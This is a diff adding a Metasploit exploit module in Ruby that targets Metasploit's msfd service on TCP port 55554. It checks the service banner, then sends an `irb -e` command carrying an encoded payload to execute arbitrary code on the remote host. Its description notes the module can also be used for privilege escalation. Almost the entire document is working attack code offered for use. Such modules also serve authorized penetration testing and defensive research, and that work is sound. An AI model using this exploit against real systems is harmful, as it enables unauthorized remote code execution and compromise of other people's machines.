@@ -1,0 +1,66 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Tcp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Metasploit msfd Remote Code Execution',
+      'Description'    => %q{
+      Metasploit's msfd-service makes it possible to get a msfconsole-like
+      interface over a TCP socket. If this socket is accessible on a remote
+      interface, an attacker can execute commands on the victim's machine.
+
+      If msfd is running with higher privileges than the current local user,
+      this module can also be used for privilege escalation. In that case,
+      port forwarding on the compromised host can be used.
+
+      Code execution is achieved with the msfconsole command: irb -e 'CODE'.
+      },
+      'Author'         => 'Robin Stenvi <robin.stenvi[at]gmail.com>',
+      'License'        => BSD_LICENSE,
+      'Platform'       => "ruby",
+      'Arch'           => ARCH_RUBY,
+      'Payload'        =>
+        {
+          'Space'    => 8192,   # Arbitrary limit
+          'BadChars' => "\x27\x0a",
+          'DisableNops' => true
+        },
+      'Targets'  =>
+        [
+          [ 'Automatic', { } ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => 'Apr 11 2018',  # Vendor notification
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        Opt::RPORT(55554)
+      ])
+  end
+
+  def check
+    connect
+    data = sock.get_once
+    if data.include?("msf")
+      disconnect
+      return Exploit::CheckCode::Appears
+    end
+    disconnect
+    return Exploit::CheckCode::Unknown
+  end
+
+  def exploit
+    connect
+    sock.get_once
+    sock.put "irb -e '" + payload.encoded + "'\n"
+    disconnect
+  end
+end
